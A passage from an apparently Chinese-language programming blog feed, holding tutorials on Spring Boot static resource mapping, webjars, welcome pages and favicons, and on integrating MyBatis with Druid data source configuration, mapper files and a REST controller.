class="hljs-name">h4</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>3、启动项目测试！</p><p><strong>我们看完语法，很多样式，我们即使现在学习了，也会忘记，所以我们在学习过程中，需要使用什么，根据官方文档来查询，才是最重要的，要熟练使用官方文档！</strong></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Springboot</tag>
      
      <tag>Thymeleaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web静态资源</title>
    <link href="/2021/04/12/SpringBoot/Web%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/"/>
    <url>/2021/04/12/SpringBoot/Web%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Web开发探究"><a href="#Web开发探究" class="headerlink" title="Web开发探究"></a>Web开发探究</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SpringBoot的东西用起来非常简单，SpringBoot最大的特点就是自动装配</p><p><strong>使用SpringBoot的步骤：</strong></p><p>1、创建一个SpringBoot应用，选择我们需要的模块，SpringBoot就会默认将我们的需要的模块自动配置好</p><p>2、手动在配置文件中配置部分配置项目就可以运行起来了</p><p>3、专注编写业务代码，不需要考虑以前那样一大堆的配置了。</p><p>要熟悉掌握开发，之前学习的自动配置的原理一定要搞明白！</p><p>比如SpringBoot到底帮我们配置了什么？我们能不能修改？我们能修改哪些配置？我们能不能扩展？</p><ul><li>向容器中自动配置组件 ：*** Autoconfiguration</li><li>自动配置类，封装配置文件的内容：***Properties</li></ul><p>没事就找找类，看看自动装配原理！</p><p>我们之后来进行一个单体项目的小项目测试，让大家能够快速上手开发！</p><p>静态资源处理</p><h2 id="静态资源映射规则"><a href="#静态资源映射规则" class="headerlink" title="静态资源映射规则"></a>静态资源映射规则</h2><p><strong>首先，我们搭建一个普通的SpringBoot项目，回顾一下HelloWorld程序！</strong></p><p>写请求非常简单，那我们要引入我们前端资源，我们项目中有许多的静态资源，比如css，js等文件，这个SpringBoot怎么处理呢？</p><p>如果我们是一个web应用，我们的main下会有一个webapp，我们以前都是将所有的页面导在这里面的，对吧！但是我们现在的pom呢，打包方式是为jar的方式，那么这种方式SpringBoot能不能来给我们写页面呢？当然是可以的，但是SpringBoot对于静态资源放置的位置，是有规定的！</p><p><strong>我们先来聊聊这个静态资源映射规则：</strong></p><p>SpringBoot中，SpringMVC的web配置都在 WebMvcAutoConfiguration 这个配置类里面；</p><p>我们可以去看看 WebMvcAutoConfigurationAdapter 中有很多配置方法；</p><p>有一个方法：addResourceHandlers 添加资源处理</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Overridepublic</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> </span>&#123; <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.resourceProperties.isAddMappings()) &#123;   <br>        <span class="hljs-comment">// 已禁用默认资源处理      </span><br>        logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);       <br>        <span class="hljs-keyword">return</span>;   <br>    &#125;   <br>    <span class="hljs-comment">// 缓存控制  </span><br>    Duration cachePeriod = <span class="hljs-keyword">this</span>.resourceProperties.getCache().getPeriod();  <br>    CacheControl cacheControl = <span class="hljs-keyword">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl();  <br>    <span class="hljs-comment">// webjars 配置   </span><br>    <span class="hljs-keyword">if</span> (!registry.hasMappingForPattern(<span class="hljs-string">&quot;/webjars/**&quot;</span>)) &#123;      <br>        customizeResourceHandlerRegistration(registry.addResourceHandler(<span class="hljs-string">&quot;/webjars/**&quot;</span>)                                            .addResourceLocations(<span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>)                                            .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));    <br>    &#125;   <br>    <span class="hljs-comment">// 静态资源配置  </span><br>    String staticPathPattern = <span class="hljs-keyword">this</span>.mvcProperties.getStaticPathPattern();    <br>    <span class="hljs-keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;      <br>        customizeResourceHandlerRegistration(registry.addResourceHandler(staticPathPattern)                                             .addResourceLocations(getResourceLocations(<span class="hljs-keyword">this</span>.resourceProperties.getStaticLocations()))                                             .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>读一下源代码：比如所有的 /webjars/** ， 都需要去 classpath:/META-INF/resources/webjars/ 找对应的资源；</p><h2 id="什么是webjars-呢？"><a href="#什么是webjars-呢？" class="headerlink" title="什么是webjars 呢？"></a>什么是webjars 呢？</h2><p>Webjars本质就是以jar包的方式引入我们的静态资源 ， 我们以前要导入一个静态资源文件，直接导入即可。</p><p>使用SpringBoot需要使用Webjars，我们可以去搜索一下：</p><p>网站：<a href="https://www.webjars.org/">https://www.webjars.org</a> </p><p>要使用jQuery，我们只要要引入jQuery对应版本的pom依赖即可！</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>导入完毕，查看webjars目录结构，并访问Jquery.js文件！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LheYVC0eZ6Rjt0MVjviaRZ6wt4N51VrTR1uzYBRo97UEoMJSnY1I0475oCajSe50e3tW5j0SXVwRA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>访问：只要是静态资源，SpringBoot就会去对应的路径寻找资源，我们这里访问：<a href="http://localhost:8080/webjars/jquery/3.4.1/jquery.js">http://localhost:8080/webjars/jquery/3.4.1/jquery.js</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LheYVC0eZ6Rjt0MVjviaRZ6JzDrsHnyDZbfzsBxwR77xMoM2ia3ic9b8uyOngzt3aH8QztXugXM2jhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="第二种静态资源映射规则"><a href="#第二种静态资源映射规则" class="headerlink" title="第二种静态资源映射规则"></a>第二种静态资源映射规则</h2><p>那我们项目中要是使用自己的静态资源该怎么导入呢？我们看下一行代码；</p><p>我们去找staticPathPattern发现第二种映射规则 ：/** , 访问当前的项目任意资源，它会去找 resourceProperties 这个类，我们可以点进去看一下分析：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 进入方法</span><br><span class="hljs-keyword">public</span> String[] getStaticLocations() &#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.staticLocations;<br>&#125;<br><span class="hljs-comment">// 找到对应的值private String[] </span><br>staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br><span class="hljs-comment">// 找到路径private static final String[] </span><br>CLASSPATH_RESOURCE_LOCATIONS = &#123;     <br>    <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>, <br>    <span class="hljs-string">&quot;classpath:/resources/&quot;</span>,    <br>    <span class="hljs-string">&quot;classpath:/static/&quot;</span>,   <br>    <span class="hljs-string">&quot;classpath:/public/&quot;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>ResourceProperties 可以设置和我们静态资源有关的参数；这里面指向了它会去寻找资源的文件夹，即上面数组的内容。</p><p>所以得出结论，以下四个目录存放的静态资源可以被我们识别：</p><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c"><span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;&quot;classpath:/resources/&quot;&quot;classpath:/static/&quot;&quot;classpath:/public/&quot;</span><br></code></pre></div></td></tr></table></figure><p>我们可以在resources根目录下新建对应的文件夹，都可以存放我们的静态文件；</p><p>比如我们访问 <a href="http://localhost:8080/1.js">http://localhost:8080/1.js</a> , 他就会去这些文件夹中寻找对应的静态资源文件；</p><h2 id="自定义静态资源路径"><a href="#自定义静态资源路径" class="headerlink" title="自定义静态资源路径"></a>自定义静态资源路径</h2><p>我们也可以自己通过配置文件来指定一下，哪些文件夹是需要我们放静态资源文件的，在application.properties中配置；</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">spring.resources.static-locations</span>=<span class="hljs-string">classpath:/coding/,classpath:/kuang/</span><br></code></pre></div></td></tr></table></figure><p>一旦自己定义了静态文件夹的路径，原来的自动配置就都会失效了！</p><p>首页处理</p><p>静态资源文件夹说完后，我们继续向下看源码！可以看到一个欢迎页的映射，就是我们的首页！</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Beanpublic</span> <br><span class="hljs-function">WelcomePageHandlerMapping <span class="hljs-title">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,                         FormattingConversionService mvcConversionService,ResourceUrlProvider mvcResourceUrlProvider)</span> </span>&#123;  <br>    WelcomePageHandlerMapping welcomePageHandlerMapping = <span class="hljs-keyword">new</span> WelcomePageHandlerMapping(     <br>        <span class="hljs-keyword">new</span> TemplateAvailabilityProviders(applicationContext), applicationContext, getWelcomePage(),<br>        <span class="hljs-comment">// getWelcomePage 获得欢迎页       </span><br>        <span class="hljs-keyword">this</span>.mvcProperties.getStaticPathPattern());    <br>    welcomePageHandlerMapping.setInterceptors(getInterceptors(mvcConversionService, mvcResourceUrlProvider));   <br>    <span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>点进去继续看</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Optional&lt;Resource&gt; <span class="hljs-title">getWelcomePage</span><span class="hljs-params">()</span> </span>&#123;  <br>    String[] locations = getResourceLocations(<span class="hljs-keyword">this</span>.resourceProperties.getStaticLocations());   <br>    <span class="hljs-comment">// ::是java8 中新引入的运算符    </span><br>    <span class="hljs-comment">// Class::function的时候function是属于Class的，应该是静态方法。  </span><br>    <span class="hljs-comment">// this::function的funtion是属于这个对象的。</span><br>    <span class="hljs-comment">// 简而言之，就是一种语法糖而已，是一种简写    </span><br>    <span class="hljs-keyword">return</span> Arrays.stream(locations).map(<span class="hljs-keyword">this</span>::getIndexHtml).filter(<span class="hljs-keyword">this</span>::isReadable).findFirst();<br>&#125;<br><span class="hljs-comment">// 欢迎页就是一个location下的的 index.html 而已</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> Resource <span class="hljs-title">getIndexHtml</span><span class="hljs-params">(String location)</span> </span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.resourceLoader.getResource(location + <span class="hljs-string">&quot;index.html&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>欢迎页，静态资源文件夹下的所有 index.html 页面；被 /** 映射。</p><p>比如我访问  <a href="http://localhost:8080/">http://localhost:8080/</a> ，就会找静态资源文件夹下的 index.html</p><p>新建一个 index.html ，在我们上面的3个目录中任意一个；然后访问测试  <a href="http://localhost:8080/">http://localhost:8080/</a>  看结果！</p><p><strong>关于网站图标说明</strong>：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LheYVC0eZ6Rjt0MVjviaRZ6ugmXIE9bON3P8hrtQAZDLnEaG1OPLNcGsuOZGGPibLGgLBuG5pqgibpQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>与其他静态资源一样，Spring Boot在配置的静态内容位置中查找 favicon.ico。如果存在这样的文件，它将自动用作应用程序的favicon。</p><p>1、关闭SpringBoot默认图标</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-comment">#关闭默认图标</span><br><span class="hljs-meta">spring.mvc.favicon.enabled</span>=<span class="hljs-string">false</span><br></code></pre></div></td></tr></table></figure><p>2、自己放一个图标在静态资源目录下，我放在 public 目录下</p><p>3、清除浏览器缓存！刷新网页，发现图标已经变成自己的了！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7LheYVC0eZ6Rjt0MVjviaRZ6awkOYiaHoiatBZQrAeAO2MFRWC5kUuyWur0XMIXHAcV8ORgM90fIaVNQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>整合MyBatis</title>
    <link href="/2021/04/12/SpringBoot/%E6%95%B4%E5%90%88MyBatis/"/>
    <url>/2021/04/12/SpringBoot/%E6%95%B4%E5%90%88MyBatis/</url>
    
    <content type="html"><![CDATA[<p>官方文档：<a href="http://mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/">http://mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/</a></p><p>Maven仓库地址：<a href="https://mvnrepository.com/artifact/org.mybatis.spring.boot/mybatis-spring-boot-starter/2.1.1">https://mvnrepository.com/artifact/org.mybatis.spring.boot/mybatis-spring-boot-starter/2.1.1</a></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KJtP0ZFbTV1gOh8TWzQjj5M0AoJvS3kvTvat9dyzbb71tQicKdTQ31PiaH8nicEx6GpaPgmcA2Qyhxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="整合测试"><a href="#整合测试" class="headerlink" title="整合测试"></a>整合测试</h2><p>1、导入 MyBatis 所需要的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xaml">&lt;dependency&gt;<br>    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;   <br>    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;    <br>    &lt;version&gt;2.1.1&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure><p>2、配置数据库连接信息（不变）</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span> <br><span class="hljs-attr">datasource:</span>   <br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>  <br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>    <br>    <span class="hljs-comment">#?serverTimezone=UTC解决时区的报错    </span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/springboot?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8</span>  <br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span> <br>    <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>    <span class="hljs-comment">#Spring Boot 默认是不注入这些属性值的，需要自己绑定  </span><br>    <span class="hljs-comment">#druid 数据源专有配置   </span><br>    <span class="hljs-attr">initialSize:</span> <span class="hljs-number">5</span>    <br>    <span class="hljs-attr">minIdle:</span> <span class="hljs-number">5</span>   <br>    <span class="hljs-attr">maxActive:</span> <span class="hljs-number">20</span>  <br>    <span class="hljs-attr">maxWait:</span> <span class="hljs-number">60000</span>  <br>    <span class="hljs-attr">timeBetweenEvictionRunsMillis:</span> <span class="hljs-number">60000</span>  <br>    <span class="hljs-attr">minEvictableIdleTimeMillis:</span> <span class="hljs-number">300000</span>   <br>    <span class="hljs-attr">validationQuery:</span> <span class="hljs-string">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-string">FROM</span> <span class="hljs-string">DUAL</span>  <br>    <span class="hljs-attr">testWhileIdle:</span> <span class="hljs-literal">true</span>   <br>    <span class="hljs-attr">testOnBorrow:</span> <span class="hljs-literal">false</span>   <br>    <span class="hljs-attr">testOnReturn:</span> <span class="hljs-literal">false</span>  <br>    <span class="hljs-attr">poolPreparedStatements:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-comment">#配置监控统计拦截的filters，stat:监控统计、log4j：日志记录、wall：防御sql注入  </span><br>    <span class="hljs-comment">#如果允许时报错  java.lang.ClassNotFoundException: org.apache.log4j.Priority  </span><br>    <span class="hljs-comment">#则导入 log4j 依赖即可，Maven 地址：https://mvnrepository.com/artifact/log4j/log4j    </span><br>    <span class="hljs-attr">filters:</span> <span class="hljs-string">stat,wall,log4j</span>   <br>    <span class="hljs-attr">maxPoolPreparedStatementPerConnectionSize:</span> <span class="hljs-number">20</span>  <br>    <span class="hljs-attr">useGlobalDataSourceStat:</span> <span class="hljs-literal">true</span>  <br>    <span class="hljs-attr">connectionProperties:</span> <span class="hljs-string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span><br></code></pre></div></td></tr></table></figure><p><strong>3、测试数据库是否连接成功！</strong></p><p><strong>4、创建实体类，导入 Lombok！</strong></p><p>Department.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@AllArgsConstructorpublic</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Department</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Integer id; <br>    <span class="hljs-keyword">private</span> String departmentName;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>5、创建mapper目录以及对应的 Mapper 接口</strong></p><p>DepartmentMapper.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//@Mapper : 表示本类是一个 MyBatis 的 Mapper</span><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-meta">@Repositorypublic</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">DepartmentMapper</span> </span>&#123;<br>    <span class="hljs-comment">// 获取所有部门信息   </span><br>    <span class="hljs-function">List&lt;Department&gt; <span class="hljs-title">getDepartments</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 通过id获得部门    </span><br>    <span class="hljs-function">Department <span class="hljs-title">getDepartment</span><span class="hljs-params">(Integer id)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>6、对应的Mapper映射文件</strong></p><p>DepartmentMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span>        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span>        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.kuang.mapper.DepartmentMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getDepartments&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Department&quot;</span>&gt;</span>       <br>        select * from department;  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getDepartment&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;Department&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;int&quot;</span>&gt;</span> <br>        select * from department where id = #&#123;id&#125;;  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>7、maven配置资源过滤问题</strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>   <br>        <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>     <br>        <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>     <br>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>    <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>    <br>        <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>8、编写部门的 DepartmentController 进行测试！</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RestControllerpublic</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DepartmentController</span> </span>&#123;     <br>    <span class="hljs-meta">@Autowired</span>  <br>    DepartmentMapper departmentMapper;     <br>    <span class="hljs-comment">// 查询全部部门    </span><br>    <span class="hljs-meta">@GetMapping(&quot;/getDepartments&quot;)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Department&gt; <span class="hljs-title">getDepartments</span><span class="hljs-params">()</span></span>&#123;     <br>        <span class="hljs-keyword">return</span> departmentMapper.getDepartments(); <br>    &#125;<br>    <span class="hljs-comment">// 查询全部部门 </span><br>    <span class="hljs-meta">@GetMapping(&quot;/getDepartment/&#123;id&#125;&quot;)</span>  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Department <span class="hljs-title">getDepartment</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span></span>&#123;   <br>        <span class="hljs-keyword">return</span> departmentMapper.getDepartment(id);   <br>    &#125; <br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>启动项目访问进行测试！</strong></p><h2 id="我们增加一个员工类再测试下，为之后做准备"><a href="#我们增加一个员工类再测试下，为之后做准备" class="headerlink" title="我们增加一个员工类再测试下，为之后做准备"></a>我们增加一个员工类再测试下，为之后做准备</h2><p>1、新建一个pojo类 Employee ；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructorpublic</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Integer id;   <br>    <span class="hljs-keyword">private</span> String lastName;  <br>    <span class="hljs-keyword">private</span> String email;   <br>    <span class="hljs-comment">//1 male, 0 female   </span><br>    <span class="hljs-keyword">private</span> Integer gender;  <br>    <span class="hljs-keyword">private</span> Integer department;    <br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Department eDepartment; <span class="hljs-comment">// 冗余设计</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、新建一个 EmployeeMapper 